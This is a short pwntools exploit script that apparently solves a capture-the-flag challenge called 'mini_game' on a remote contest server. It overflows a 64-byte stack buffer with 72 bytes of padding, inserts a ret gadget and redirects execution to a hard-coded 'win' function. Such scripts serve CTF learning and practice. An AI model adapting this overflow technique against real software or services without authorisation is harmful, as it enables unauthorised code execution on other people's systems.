from pwn import *

exe = ELF("./mini_game")
p = remote("offsec.m0lecon.it", 13524)

#offset to function pointer
#python3 -c "from pwn import *; print(cyclic(200))
#64B (buf) + 8B (saved RBP)
OFFSET_TO_RIP = 72
ret_gadget = 0x40101a
#address of winning function
win = 0x00000000004011fb

p.recvuntil(b"go?")
payload = flat(
    b'A' * OFFSET_TO_RIP,
    p64(ret_gadget),
    p64(win),
)
p.send(payload)

p.interactive()
